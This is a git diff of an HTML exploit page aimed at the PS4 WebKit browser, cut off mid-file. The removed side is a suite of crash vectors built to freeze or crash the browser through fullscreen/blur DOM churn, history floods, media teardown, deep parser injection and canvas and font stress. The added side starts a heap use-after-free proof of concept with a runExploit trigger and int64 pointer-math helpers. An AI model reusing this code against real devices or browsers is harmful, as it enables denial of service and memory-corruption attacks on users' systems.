@@ -1,1394 +1,328 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
-  <title>PS4 WebKit Crash Vectors – V3 (Varied Vectors)</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebKit Heap UaF PoC (All-in-One)</title>
+    <style>
+        body { font-family: monospace; background-color: #f0f0f0; padding: 20px; }
+        .container { 
+            border: 2px dashed #333; 
+            padding: 20px; 
+            margin-bottom: 20px; 
+            background: #fff;
+        }
+        .child { 
+            width: 100px; 
+            height: 100px; 
+            background-color: blue; 
+            border: 2px solid darkblue;
+        }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+        #log-area { margin-top: 20px; border-top: 1px solid #ccc; padding-top: 10px; }
+    </style>
 </head>
 <body>
-  <h1>PS4 WebKit Crash Vectors – V3 (Varied Vectors)</h1>
-  <p>
-    Objetivo: PoC visual (freeze/crash/fechamento do navegador). Sem WebGL / sem JIT / sem IndexedDB.
-    Execute um teste por vez. Use STOP para abortar e limpar.
-  </p>
 
-  <hr>
+    <h2>WebKit UaF PoC (RenderLayer)</h2>
+    <p>Clique abaixo para iniciar a sequência de trigger.</p>
+    <button onclick="runExploit()">Iniciar PoC</button>
 
-  <div>
-    <button id="btnClear">Limpar Log</button>
-    <button id="btnStop">STOP (abortar e limpar)</button>
-  </div>
+    <div class="container">
+        <div class="child"></div>
+    </div>
 
-  <pre id="log" style="white-space:pre-wrap;border:1px solid #999;padding:10px;min-height:220px;"></pre>
-
-  <hr>
-
-  <h2>Fullscreen + blur + DOM mutation (V3 Variants)</h2>
-  <button id="fsA">FS-A: Fullscreen + blur + remove/replace subtree + forced layout</button>
-  <button id="fsB">FS-B: Fullscreen + visibilitychange + iframe churn + detach/attach</button>
-  <button id="fsC">FS-C: Fullscreen toggling loop + blur-triggered style invalidation storm</button>
-
-  <h2>History.pushState + objetos complexos (V3 Variants)</h2>
-  <button id="hsA">HS-A: pushState com referências repetidas + strings grandes + typed arrays</button>
-  <button id="hsB">HS-B: push/replace + popstate (DOM churn + layout read) + back/forward cadence</button>
-  <button id="hsC">HS-C: URL/hash stress + state rotation (many entries) + synchronous DOM reads</button>
-
-  <h2>Media teardown (video/audio/TextTrack) (V3 Variants)</h2>
-  <button id="mdA">MD-A: criar/remover video+audio (invalid src) + load() + src reset</button>
-  <button id="mdB">MD-B: TextTrack cues churn (add/remove) + remove element during events</button>
-  <button id="mdC">MD-C: source element swapping + rapid attribute flips (muted/loop/preload)</button>
-
-  <h2>DOM deep recursion / layout storms (V3 Variants)</h2>
-  <button id="dlA">DL-A: deep DOM (programmatic) + alternating overflow/contain + layout reads</button>
-  <button id="dlB">DL-B: parser deep HTML injection + incremental tree rebuild + rAF storms</button>
-  <button id="dlC">DL-C: table layout stress + dynamic colspan/rowspan mutations</button>
-
-  <h2>Canvas 2D resize/destruction loops (V3 Variants)</h2>
-  <button id="cvA">CV-A: canvas realloc (1?4096) + gradients + pattern attempts</button>
-  <button id="cvB">CV-B: offscreen-like churn (many canvases) + drawImage self-copy loops</button>
-  <button id="cvC">CV-C: imageData put/get loops + size flips (bounded)</button>
-
-  <h2>Font loading stress (V3 Variants)</h2>
-  <button id="fnA">FN-A: @font-face toggling em massa + milhares de nós + relayout</button>
-  <button id="fnB">FN-B: FontFace API loop (se existir) + add/remove em document.fonts</button>
-  <button id="fnC">FN-C: font-family thrash + style element rebuild + GC pressure</button>
-
-  <h2>Workers (com cuidado) (V3 Variants)</h2>
-  <button id="wkA">WK-A: Workers LOW paced (create/terminate) + message bursts</button>
-  <button id="wkB">WK-B: Worker ping-pong + rapid terminate/recreate cadence</button>
-  <button id="wkC">WK-C: Worker chain (worker spawns work, main tears down fast) – bounded</button>
+    <div id="log-area"><h3>Logs:</h3></div>
 
 <script>
-(function () {
-  "use strict";
+/* ==========================================
+   PARTE 1: int64.mjs (Matemática de Ponteiros)
+   ========================================== */
 
-  const logEl = document.getElementById("log");
-  let ABORT = false;
+function check_range(x) {
+    return (-0x80000000 <= x) && (x <= 0xffffffff);
+}
 
-  function ts() {
-    const d = new Date();
-    const p2 = (n) => (n < 10 ? "0" + n : "" + n);
-    return `${p2(d.getHours())}:${p2(d.getMinutes())}:${p2(d.getSeconds())}`;
-  }
-
-  function log(msg) {
-    logEl.textContent += `[${ts()}] ${msg}\n`;
-    logEl.scrollTop = logEl.scrollHeight;
-  }
-
-  function clearLog() { logEl.textContent = ""; }
-
-  function resetAbort() { ABORT = false; }
-
-  function stopAll() {
-    ABORT = true;
-    log("STOP requested: abort flag set. Cleaning up...");
-
-    try {
-      if (document.fullscreenElement && document.exitFullscreen) document.exitFullscreen();
-      if (document.webkitFullscreenElement && document.webkitExitFullscreen) document.webkitExitFullscreen();
-    } catch (e) {}
-
-    const nodes = document.querySelectorAll("[data-test-container='1']");
-    for (let i = 0; i < nodes.length; i++) {
-      try { nodes[i].remove(); } catch (e) {}
+function unhexlify(hexstr) {
+    if (hexstr.substring(0, 2) === "0x") {
+        hexstr = hexstr.substring(2);
+    }
+    if (hexstr.length % 2 === 1) {
+        hexstr = '0' + hexstr;
+    }
+    if (hexstr.length % 2 === 1) {
+        throw TypeError("Invalid hex string");
     }
 
-    if (window.__WORKERS && window.__WORKERS.length) {
-      for (const w of window.__WORKERS) {
-        try { w.terminate(); } catch (e) {}
-      }
-      window.__WORKERS.length = 0;
-      log("Workers terminated.");
+    let bytes = new Uint8Array(hexstr.length / 2);
+    for (let i = 0; i < hexstr.length; i += 2) {
+        let new_i = hexstr.length - 2 - i;
+        let substr = hexstr.slice(new_i, new_i + 2);
+        bytes[i / 2] = parseInt(substr, 16);
     }
 
-    if (window.__WORKER_BLOB_URL) {
-      try { URL.revokeObjectURL(window.__WORKER_BLOB_URL); } catch (e) {}
-      window.__WORKER_BLOB_URL = null;
-    }
-
-    window.onblur = null;
-    document.onvisibilitychange = null;
-    window.onpopstate = null;
-
-    log("Cleanup complete.");
-  }
-
-  function requireTrustedClick(e) {
-    if (!e || !e.isTrusted) {
-      log("Blocked: requires a real user gesture (trusted click).");
-      return false;
-    }
-    return true;
-  }
-
-  function mkContainer(title) {
-    const c = document.createElement("div");
-    c.setAttribute("data-test-container", "1");
-    c.style.border = "1px dashed #666";
-    c.style.padding = "8px";
-    c.style.margin = "10px 0";
-    const h = document.createElement("div");
-    h.textContent = title;
-    h.style.fontWeight = "bold";
-    c.appendChild(h);
-    document.body.appendChild(c);
-    return c;
-  }
-
-  function allocGarbage(rounds, size) {
-    const junk = [];
-    for (let i = 0; i < rounds; i++) {
-      if (ABORT) return null;
-      const a = new Uint8Array(size);
-      a[0] = 0x41;
-      a[size - 1] = 0x42;
-      junk.push(a);
-    }
-    return junk;
-  }
-
-  function requestFS() {
-    try {
-      const el = document.documentElement;
-      if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-      else if (el.requestFullscreen) el.requestFullscreen();
-      else log("Fullscreen API not available.");
-    } catch (ex) {
-      log("Fullscreen request exception: " + ex);
-    }
-  }
-
-  /* ============================================================
-     FULLSCREEN VARIANTS
-     ============================================================ */
-
-  function fsA(e) {
-    if (!requireTrustedClick(e)) return;
-    resetAbort();
-
-    const c = mkContainer("FS-A: Fullscreen + blur + subtree replace + forced layout");
-    log("FS-A: installing onblur hook; entering fullscreen...");
-    requestFS();
-
-    // Build a baseline subtree
-    const root = document.createElement("div");
-    root.style.border = "1px solid #ccc";
-    root.style.padding = "4px";
-    c.appendChild(root);
-
-    function buildSubtree(depth, width) {
-      let cur = document.createElement("div");
-      cur.textContent = "ROOT";
-      let top = cur;
-      for (let d = 0; d < depth; d++) {
-        const n = document.createElement("div");
-        n.textContent = "D" + d + " " + "X".repeat(width);
-        if (d % 5 === 0) n.style.display = "inline-block";
-        if (d % 7 === 0) n.style.position = "relative";
-        if (d % 7 === 0) n.style.left = "1px";
-        cur.appendChild(n);
-        cur = n;
-      }
-      return top;
-    }
-
-    let sub = buildSubtree(800, 48);
-    root.appendChild(sub);
-
-    window.onblur = function () {
-      if (ABORT) return;
-      log("FS-A: onblur fired ? replacing subtree + layout reads + GC pressure");
-      try {
-        // replace subtree repeatedly
-        for (let i = 0; i < 8; i++) {
-          if (ABORT) return;
-          const newSub = buildSubtree(600 + (i * 50), 64);
-          root.replaceChild(newSub, root.firstChild);
-          // forced layout reads
-          void root.offsetWidth;
-          void root.offsetHeight;
-        }
-        allocGarbage(200, 4096);
-      } catch (ex) {
-        log("FS-A exception: " + ex);
-      }
-    };
-
-    document.onvisibilitychange = function () {
-      if (ABORT) return;
-      log("FS-A: visibilitychange fired (state=" + document.visibilityState + ")");
-    };
-
-    log("FS-A: now trigger blur/overlay (OPTIONS/PS) to run mutation.");
-  }
-
-  function fsB(e) {
-    if (!requireTrustedClick(e)) return;
-    resetAbort();
-
-    const c = mkContainer("FS-B: Fullscreen + visibilitychange + iframe churn + detach/attach");
-    log("FS-B: entering fullscreen, then waiting visibilitychange...");
-    requestFS();
-
-    // Create an iframe and churn it on visibilitychange
-    const holder = document.createElement("div");
-    holder.style.border = "1px solid #ccc";
-    holder.style.padding = "4px";
-    c.appendChild(holder);
-
-    function makeFrame() {
-      const f = document.createElement("iframe");
-      f.width = "320";
-      f.height = "180";
-      // about:blank is fine; write a small document to force subtree build
-      try {
-        holder.appendChild(f);
-        const doc = f.contentDocument;
-        if (doc) {
-          doc.open();
-          doc.write("<!doctype html><html><body><div>IFRAME</div></body></html>");
-          doc.close();
-        }
-      } catch (ex) {}
-      return f;
-    }
-
-    let frame = makeFrame();
-    let count = 0;
-
-    document.onvisibilitychange = function () {
-      if (ABORT) return;
-      count++;
-      log("FS-B: visibilitychange #" + count + " state=" + document.visibilityState);
-
-      try {
-        // Detach/attach cycle
-        for (let i = 0; i < 12; i++) {
-          if (ABORT) return;
-          if (frame && frame.parentNode) frame.remove();
-          // churn DOM around it
-          const d = document.createElement("div");
-          d.textContent = "CHURN " + count + "/" + i + " " + "Y".repeat(128);
-          holder.appendChild(d);
-          if (holder.childNodes.length > 40) holder.removeChild(holder.firstChild);
-          frame = makeFrame();
-          void holder.offsetHeight;
-        }
-        allocGarbage(160, 4096);
-      } catch (ex) {
-        log("FS-B exception: " + ex);
-      }
-    };
-
-    window.onblur = function () {
-      if (ABORT) return;
-      log("FS-B: onblur fired.");
-    };
-
-    log("FS-B: trigger overlay to fire visibilitychange.");
-  }
-
-  function fsC(e) {
-    if (!requireTrustedClick(e)) return;
-    resetAbort();
-
-    const c = mkContainer("FS-C: Fullscreen toggling loop + blur-triggered style invalidation storm");
-    log("FS-C: preparing toggling. Enter fullscreen once and then toggle exit/request.");
-
-    const box = document.createElement("div");
-    box.textContent = "STYLE-STORM BOX";
-    box.style.border = "1px solid #ccc";
-    box.style.padding = "6px";
-    c.appendChild(box);
-
-    // enter fullscreen
-    requestFS();
-
-    let toggles = 0;
-    const maxToggles = 30;
-
-    function exitFS() {
-      try {
-        if (document.webkitExitFullscreen) document.webkitExitFullscreen();
-        else if (document.exitFullscreen) document.exitFullscreen();
-      } catch (e) {}
-    }
-
-    function toggleLoop() {
-      if (ABORT) return;
-      toggles++;
-      if (toggles % 2 === 0) exitFS();
-      else requestFS();
-
-      // churn styles to create invalidation storms
-      try {
-        box.style.width = (toggles % 3 === 0) ? "97%" : "98%";
-        box.style.fontSize = (toggles % 4 === 0) ? "16px" : "15px";
-        box.style.letterSpacing = (toggles % 5 === 0) ? "1px" : "0px";
-        void box.offsetWidth;
-      } catch (ex) {}
-
-      log("FS-C: toggle " + toggles + "/" + maxToggles);
-
-      if (toggles < maxToggles) setTimeout(toggleLoop, 120);
-      else log("FS-C: toggling loop done. Now trigger blur to run extra storm.");
-    }
-
-    window.onblur = function () {
-      if (ABORT) return;
-      log("FS-C: onblur fired ? heavy invalidation storm + subtree churn");
-      try {
-        for (let i = 0; i < 2000; i++) {
-          if (ABORT) return;
-          const n = document.createElement("span");
-          n.textContent = "Z";
-          n.style.display = (i % 2) ? "inline" : "inline-block";
-          if (i % 11 === 0) n.style.position = "relative";
-          box.appendChild(n);
-          if (box.childNodes.length > 6000) box.removeChild(box.firstChild);
-          if (i % 50 === 0) void box.offsetHeight;
-        }
-        allocGarbage(220, 4096);
-      } catch (ex) {
-        log("FS-C exception: " + ex);
-      }
-    };
-
-    toggleLoop();
-  }
-
-  /* ============================================================
-     HISTORY VARIANTS
-     ============================================================ */
-
-  function buildComplexState(seed) {
-    const big = "A".repeat(4000) + seed + "B".repeat(4000);
-    const shared = { marker: "shared-" + seed, pad: "C".repeat(2048) };
-
-    const obj = {
-      seed,
-      time: Date.now(),
-      big,
-      shared1: shared,
-      shared2: shared,
-      arr: [],
-      dict: {}
-    };
-
-    for (let i = 0; i < 120; i++) {
-      obj.arr.push({ i, s: "S".repeat(96) + i, nested: { k: "K".repeat(48), ref: shared } });
-      obj.dict["k" + i] = { i, v: "V".repeat(72) };
-    }
-
-    obj.buf = new ArrayBuffer(2048);
-    obj.u8 = new Uint8Array(obj.buf);
-    obj.u8[0] = 0x12;
-    obj.u8[1] = 0x34;
-
-    return obj;
-  }
-
-  function hsA(e) {
-    if (!requireTrustedClick(e)) return;
-    resetAbort();
-
-    mkContainer("HS-A: pushState complex + aliasing + typed arrays");
-    log("HS-A: starting pushState loop...");
-
-    let i = 0;
-    const max = 80;
-
-    function step() {
-      if (ABORT) return;
-      i++;
-      try {
-        const st = buildComplexState("hsA-" + i);
-        history.pushState(st, "", "#hsA-" + i);
-        const rs = history.state;
-        log("HS-A: i=" + i + " state.seed=" + (rs && rs.seed));
-        if (i % 10 === 0) allocGarbage(80, 4096);
-      } catch (ex) {
-        log("HS-A exception: " + ex);
-        return;
-      }
-      if (i < max) setTimeout(step, 0);
-      else log("HS-A completed.");
-    }
-    step();
-  }
-
-  function hsB(e) {
-    if (!requireTrustedClick(e)) return;
-    resetAbort();
-
-    const c = mkContainer("HS-B: push/replace + popstate DOM churn + cadence back/forward");
-    log("HS-B: wiring popstate...");
-
-    let popCount = 0;
-    window.onpopstate = function (ev) {
-      popCount++;
-      const st = ev ? ev.state : null;
-      log("HS-B: popstate #" + popCount + " seed=" + (st && st.seed));
-      try {
-        for (let k = 0; k < 240; k++) {
-          if (ABORT) return;
-          const n = document.createElement("div");
-          n.textContent = "POP " + popCount + " / " + k + " " + "X".repeat(64);
-          c.appendChild(n);
-        }
-        // trim
-        while (c.childNodes.length > 600) c.removeChild(c.firstChild);
-        void c.offsetHeight;
-      } catch (ex) {
-        log("HS-B popstate exception: " + ex);
-      }
-    };
-
-    let i = 0;
-    const max = 120;
-
-    function navStep() {
-      if (ABORT) return;
-      i++;
-      try {
-        const st = buildComplexState("hsB-" + i);
-        if (i % 2 === 0) history.replaceState(st, "", "#rB-" + i);
-        else history.pushState(st, "", "#pB-" + i);
-
-        // cadence: back then forward patterns
-        if (i % 7 === 0) { log("HS-B: history.back()"); history.back(); }
-        if (i % 11 === 0) { log("HS-B: history.forward()"); history.forward(); }
-
-        // sync DOM reads to stress
-        void document.body.offsetHeight;
-        if (i % 12 === 0) allocGarbage(60, 4096);
-
-        log("HS-B: step i=" + i);
-      } catch (ex) {
-        log("HS-B exception: " + ex);
-        return;
-      }
-
-      if (i < max) setTimeout(navStep, 0);
-      else log("HS-B completed.");
-    }
-
-    navStep();
-  }
-
-  function hsC(e) {
-    if (!requireTrustedClick(e)) return;
-    resetAbort();
-
-    mkContainer("HS-C: hash/url stress + state rotation + sync DOM reads");
-    log("HS-C: starting...");
-
-    let i = 0;
-    const max = 200;
-
-    function step() {
-      if (ABORT) return;
-      i++;
-      try {
-        const st = buildComplexState("hsC-" + i);
-        // Stress hash churn plus state
-        const hash = "#H" + i + "-" + ("Z".repeat(64));
-        history.pushState(st, "", hash);
-
-        // synchronous reads
-        void document.documentElement.offsetWidth;
-        void document.documentElement.offsetHeight;
-
-        if (i % 25 === 0) log("HS-C: i=" + i + " hashlen=" + (location.hash ? location.hash.length : 0));
-        if (i % 30 === 0) allocGarbage(40, 8192);
-      } catch (ex) {
-        log("HS-C exception: " + ex);
-        return;
-      }
-      if (i < max) setTimeout(step, 0);
-      else log("HS-C completed.");
-    }
-
-    step();
-  }
-
-  /* ============================================================
-     MEDIA VARIANTS
-     ============================================================ */
-
-  const invalidVideoSrcs = ["data:video/mp4;base64,", "data:video/webm;base64,", "blob:null/invalid"];
-  const invalidAudioSrcs = ["data:audio/mp3;base64,", "data:audio/wav;base64,"];
-
-  function mdA(e) {
-    if (!requireTrustedClick(e)) return;
-    resetAbort();
-
-    const c = mkContainer("MD-A: create/remove video+audio + load + src reset");
-    log("MD-A: starting...");
-
-    let iter = 0;
-    const max = 160;
-
-    function oneRound() {
-      if (ABORT) return;
-      iter++;
-      try {
-        const v = document.createElement("video");
-        v.muted = true;
-        v.preload = "auto";
-        v.src = invalidVideoSrcs[iter % invalidVideoSrcs.length];
-        c.appendChild(v);
-
-        const a = document.createElement("audio");
-        a.preload = "auto";
-        a.src = invalidAudioSrcs[iter % invalidAudioSrcs.length];
-        c.appendChild(a);
-
-        try { v.load(); } catch (e1) {}
-        try { a.load(); } catch (e2) {}
-
-        v.remove();
-        a.remove();
-
-        try { v.src = ""; v.load(); } catch (e3) {}
-        try { a.src = ""; a.load(); } catch (e4) {}
-
-        if (iter % 10 === 0) allocGarbage(80, 4096);
-        if (iter % 20 === 0) log("MD-A: iter=" + iter);
-      } catch (ex) {
-        log("MD-A exception: " + ex);
-        return;
-      }
-      if (iter < max) setTimeout(oneRound, 0);
-      else log("MD-A completed.");
-    }
-    oneRound();
-  }
-
-  function mdB(e) {
-    if (!requireTrustedClick(e)) return;
-    resetAbort();
-
-    const c = mkContainer("MD-B: TextTrack cues churn + remove during events");
-    log("MD-B: starting...");
-
-    let iter = 0;
-    const max = 80;
-
-    function round() {
-      if (ABORT) return;
-      iter++;
-      try {
-        const v = document.createElement("video");
-        v.muted = true;
-        v.preload = "auto";
-        v.src = invalidVideoSrcs[iter % invalidVideoSrcs.length];
-        c.appendChild(v);
-
-        // attempt track APIs (guard)
-        let tt = null;
-        try { tt = v.addTextTrack ? v.addTextTrack("subtitles", "x", "en") : null; } catch (e1) {}
-        if (tt && tt.addCue) {
-          // add + remove cues quickly
-          const cues = [];
-          for (let i = 0; i < 60; i++) {
-            if (ABORT) return;
-            let cue = null;
-            if (typeof VTTCue !== "undefined") cue = new VTTCue(i, i + 0.5, "CUE-" + iter + "-" + i);
-            else if (typeof TextTrackCue !== "undefined") cue = new TextTrackCue(i, i + 0.5, "CUE-" + iter + "-" + i);
-            if (cue) { tt.addCue(cue); cues.push(cue); }
-          }
-          // remove half
-          for (let i = 0; i < cues.length; i += 2) {
-            if (ABORT) return;
-            try { tt.removeCue(cues[i]); } catch (e2) {}
-          }
-        }
-
-        // remove element quickly (during potential async internal processing)
-        v.remove();
-        try { v.src = ""; v.load(); } catch (e3) {}
-
-        if (iter % 8 === 0) allocGarbage(60, 4096);
-        log("MD-B: iter=" + iter);
-      } catch (ex) {
-        log("MD-B exception: " + ex);
-        return;
-      }
-      if (iter < max) setTimeout(round, 0);
-      else log("MD-B completed.");
-    }
-    round();
-  }
-
-  function mdC(e) {
-    if (!requireTrustedClick(e)) return;
-    resetAbort();
-
-    const c = mkContainer("MD-C: <source> swapping + rapid attribute flips");
-    log("MD-C: starting...");
-
-    let iter = 0;
-    const max = 140;
-
-    function round() {
-      if (ABORT) return;
-      iter++;
-      try {
-        const v = document.createElement("video");
-        v.preload = (iter % 2 === 0) ? "auto" : "metadata";
-        v.loop = (iter % 3 === 0);
-        v.muted = (iter % 4 !== 0);
-        v.controls = false;
-
-        // use <source> children to trigger different parsing paths
-        const s1 = document.createElement("source");
-        s1.src = invalidVideoSrcs[iter % invalidVideoSrcs.length];
-        s1.type = (iter % 2 === 0) ? "video/mp4" : "video/webm";
-        v.appendChild(s1);
-
-        const s2 = document.createElement("source");
-        s2.src = invalidVideoSrcs[(iter + 1) % invalidVideoSrcs.length];
-        s2.type = (iter % 2 === 0) ? "video/webm" : "video/mp4";
-        v.appendChild(s2);
-
-        c.appendChild(v);
-
-        try { v.load(); } catch (e1) {}
-
-        // swap sources
-        v.removeChild(s1);
-        v.insertBefore(s1, v.firstChild);
-        try { v.load(); } catch (e2) {}
-
-        // teardown
-        v.remove();
-        try { v.src = ""; v.load(); } catch (e3) {}
-
-        if (iter % 20 === 0) log("MD-C: iter=" + iter);
-        if (iter % 15 === 0) allocGarbage(40, 8192);
-      } catch (ex) {
-        log("MD-C exception: " + ex);
-        return;
-      }
-      if (iter < max) setTimeout(round, 0);
-      else log("MD-C completed.");
-    }
-    round();
-  }
-
-  /* ============================================================
-     DOM / LAYOUT VARIANTS
-     ============================================================ */
-
-  function dlA(e) {
-    if (!requireTrustedClick(e)) return;
-    resetAbort();
-
-    const c = mkContainer("DL-A: deep DOM + overflow/contain toggles + layout reads");
-    log("DL-A: building deep chain...");
-
-    let cur = c;
-    for (let i = 0; i < 5000; i++) {
-      if (ABORT) return;
-      const n = document.createElement("div");
-      n.textContent = (i % 250 === 0) ? ("NODE-" + i) : "";
-      if (i % 3 === 0) n.style.overflow = "hidden";
-      if (i % 5 === 0) n.style.overflow = "auto";
-      if (i % 7 === 0) n.style.contain = "layout";
-      if (i % 11 === 0) n.style.contain = "none";
-      cur.appendChild(n);
-      cur = n;
-    }
-
-    log("DL-A: starting toggle storm...");
-    let iter = 0;
-    const max = 1200;
-
-    function loop() {
-      if (ABORT) return;
-      iter++;
-      try {
-        c.style.width = (iter % 2 === 0) ? "97%" : "98%";
-        c.style.padding = (iter % 3 === 0) ? "2px" : "1px";
-        void c.offsetHeight;
-        void c.offsetWidth;
-        if (iter % 60 === 0) log("DL-A: iter=" + iter);
-        if (iter % 100 === 0) allocGarbage(50, 4096);
-      } catch (ex) {
-        log("DL-A exception: " + ex);
-        return;
-      }
-      if (iter < max) requestAnimationFrame(loop);
-      else log("DL-A completed.");
-    }
-    requestAnimationFrame(loop);
-  }
-
-  function dlB(e) {
-    if (!requireTrustedClick(e)) return;
-    resetAbort();
-
-    const c = mkContainer("DL-B: parser deep injection + incremental rebuild + rAF storms");
-    log("DL-B: building parser string...");
-
-    try {
-      const depth = 7000;
-      let s = "";
-      for (let i = 0; i < depth; i++) {
-        if (ABORT) return;
-        s += "<div>";
-      }
-      s += "<div>PAYLOAD-" + "X".repeat(32) + "</div>";
-      for (let i = 0; i < depth; i++) {
-        if (ABORT) return;
-        s += "</div>";
-      }
-      const p = document.createElement("div");
-      p.innerHTML = s;
-      c.appendChild(p);
-      log("DL-B: parser insertion completed depth=" + depth);
-    } catch (ex) {
-      log("DL-B parser exception: " + ex);
-    }
-
-    let frame = 0;
-    const maxFrames = 1500;
-
-    function rafLoop() {
-      if (ABORT) return;
-      frame++;
-      try {
-        // incremental rebuild: remove/add chunks
-        if (frame % 10 === 0) {
-          const n = document.createElement("div");
-          n.textContent = "REB-" + frame + " " + "Y".repeat(128);
-          c.appendChild(n);
-          if (c.childNodes.length > 120) c.removeChild(c.firstChild);
-        }
-        // force layout
-        void c.offsetHeight;
-        if (frame % 75 === 0) log("DL-B: frame=" + frame);
-        if (frame % 120 === 0) allocGarbage(40, 8192);
-      } catch (ex) {
-        log("DL-B raf exception: " + ex);
-        return;
-      }
-      if (frame < maxFrames) requestAnimationFrame(rafLoop);
-      else log("DL-B completed.");
-    }
-    requestAnimationFrame(rafLoop);
-  }
-
-  function dlC(e) {
-    if (!requireTrustedClick(e)) return;
-    resetAbort();
-
-    const c = mkContainer("DL-C: table layout stress + dynamic colspan/rowspan mutations");
-    log("DL-C: building table...");
-
-    const table = document.createElement("table");
-    table.border = "1";
-    table.style.width = "98%";
-    c.appendChild(table);
-
-    const rows = 60;
-    const cols = 20;
-
-    for (let r = 0; r < rows; r++) {
-      if (ABORT) return;
-      const tr = document.createElement("tr");
-      for (let k = 0; k < cols; k++) {
-        const td = document.createElement("td");
-        td.textContent = "R" + r + "C" + k;
-        tr.appendChild(td);
-      }
-      table.appendChild(tr);
-    }
-
-    let iter = 0;
-    const max = 900;
-
-    function loop() {
-      if (ABORT) return;
-      iter++;
-      try {
-        // mutate random-ish cells deterministically
-        const r = iter % rows;
-        const tr = table.rows[r];
-        if (tr && tr.cells.length) {
-          const idx = iter % tr.cells.length;
-          const td = tr.cells[idx];
-          if (td) {
-            td.colSpan = (iter % 5) + 1;
-            td.rowSpan = (iter % 3) + 1;
-            td.textContent = "M" + iter + " " + "Z".repeat(32);
-          }
-        }
-        void table.offsetHeight;
-        if (iter % 60 === 0) log("DL-C: iter=" + iter);
-        if (iter % 100 === 0) allocGarbage(30, 8192);
-      } catch (ex) {
-        log("DL-C exception: " + ex);
-        return;
-      }
-      if (iter < max) requestAnimationFrame(loop);
-      else log("DL-C completed.");
-    }
-
-    requestAnimationFrame(loop);
-  }
-
-  /* ============================================================
-     CANVAS VARIANTS
-     ============================================================ */
-
-  function cvA(e) {
-    if (!requireTrustedClick(e)) return;
-    resetAbort();
-
-    const c = mkContainer("CV-A: realloc (1?4096) + gradients + patterns");
-    log("CV-A: starting...");
-
-    let iter = 0;
-    const max = 700;
-
-    function step() {
-      if (ABORT) return;
-      iter++;
-      try {
-        const canvas = document.createElement("canvas");
-        const s = (iter % 4 === 0) ? 4096 : (iter % 3 === 0) ? 2048 : (iter % 2 === 0) ? 1024 : 1;
-        canvas.width = s;
-        canvas.height = s;
-        c.appendChild(canvas);
-
-        const ctx = canvas.getContext("2d");
-        if (ctx) {
-          ctx.clearRect(0, 0, s, s);
-          ctx.fillRect(0, 0, Math.min(64, s), Math.min(64, s));
-          try {
-            const g = ctx.createRadialGradient(0, 0, 1, Math.min(256, s), Math.min(256, s), Math.min(256, s));
-            for (let i = 0; i < 250; i++) g.addColorStop(i / 250, "rgb(" + (i % 255) + ",0,0)");
-            ctx.fillStyle = g;
-            ctx.fillRect(0, 0, Math.min(512, s), Math.min(512, s));
-          } catch (ex) {}
-          // pattern attempt with tiny canvas
-          try {
-            const t = document.createElement("canvas");
-            t.width = 2; t.height = 2;
-            const tctx = t.getContext("2d");
-            if (tctx) tctx.fillRect(0,0,2,2);
-            const p = ctx.createPattern(t, "repeat");
-            if (p) {
-              ctx.fillStyle = p;
-              ctx.fillRect(0, 0, Math.min(512, s), Math.min(512, s));
+    return bytes;
+}
+
+function operation(f, nargs) {
+    return function () {
+        if (arguments.length !== nargs)
+            throw Error("Not enough arguments for function " + f.name);
+        let new_args = [];
+        for (let i = 0; i < arguments.length; i++) {
+            if (!(arguments[i] instanceof Int)) {
+                new_args[i] = new Int(arguments[i]);
+            } else {
+                new_args[i] = arguments[i];
             }
-          } catch (ex) {}
+        }
+        return f.apply(this, new_args);
+    };
+}
+
+class Int {
+    constructor(low, high) {
+        let buffer = new Uint32Array(2);
+        let bytes = new Uint8Array(buffer.buffer);
+
+        if (arguments.length > 2) {
+            throw TypeError('Int takes at most 2 args');
+        }
+        if (arguments.length === 0) {
+            throw TypeError('Int takes at min 1 args');
+        }
+        let is_one = false;
+        if (arguments.length === 1) {
+            is_one = true;
         }
 
-        canvas.remove();
-
-        if (iter % 50 === 0) log("CV-A: iter=" + iter);
-        if (iter % 80 === 0) allocGarbage(60, 4096);
-      } catch (ex) {
-        log("CV-A exception: " + ex);
-        return;
-      }
-
-      if (iter < max) setTimeout(step, 0);
-      else log("CV-A completed.");
-    }
-    step();
-  }
-
-  function cvB(e) {
-    if (!requireTrustedClick(e)) return;
-    resetAbort();
-
-    const c = mkContainer("CV-B: many canvases + drawImage self-copy loops");
-    log("CV-B: starting...");
-
-    let iter = 0;
-    const max = 240;
-
-    function step() {
-      if (ABORT) return;
-      iter++;
-
-      try {
-        const canvases = [];
-        for (let i = 0; i < 24; i++) {
-          if (ABORT) return;
-          const cnv = document.createElement("canvas");
-          cnv.width = (i % 2 === 0) ? 512 : 256;
-          cnv.height = (i % 3 === 0) ? 512 : 256;
-          c.appendChild(cnv);
-          canvases.push(cnv);
-
-          const ctx = cnv.getContext("2d");
-          if (ctx) {
-            ctx.fillRect(0, 0, cnv.width, cnv.height);
-            // self-copy (bounded)
-            for (let k = 0; k < 10; k++) {
-              ctx.drawImage(cnv, 0, 0, cnv.width, cnv.height);
+        if (!is_one) {
+            if (typeof (low) !== 'number'
+                && typeof (high) !== 'number') {
+                throw TypeError('low/high must be numbers');
             }
-          }
         }
 
-        // cleanup
-        for (const cnv of canvases) cnv.remove();
-
-        if (iter % 20 === 0) log("CV-B: iter=" + iter);
-        if (iter % 30 === 0) allocGarbage(40, 8192);
-      } catch (ex) {
-        log("CV-B exception: " + ex);
-        return;
-      }
-
-      if (iter < max) setTimeout(step, 0);
-      else log("CV-B completed.");
-    }
-
-    step();
-  }
-
-  function cvC(e) {
-    if (!requireTrustedClick(e)) return;
-    resetAbort();
-
-    const c = mkContainer("CV-C: imageData put/get loops + size flips (bounded)");
-    log("CV-C: starting...");
-
-    let iter = 0;
-    const max = 500;
-
-    function step() {
-      if (ABORT) return;
-      iter++;
-
-      try {
-        const canvas = document.createElement("canvas");
-        const s = (iter % 5 === 0) ? 1024 : (iter % 2 === 0) ? 512 : 128;
-        canvas.width = s;
-        canvas.height = s;
-        c.appendChild(canvas);
-
-        const ctx = canvas.getContext("2d");
-        if (ctx) {
-          const img = ctx.createImageData(Math.min(256, s), Math.min(256, s));
-          // touch pixels
-          for (let i = 0; i < img.data.length; i += 97) img.data[i] = (i ^ iter) & 0xff;
-          ctx.putImageData(img, 0, 0);
-          // read back (forces internal copy)
-          ctx.getImageData(0, 0, Math.min(128, s), Math.min(128, s));
-        }
-
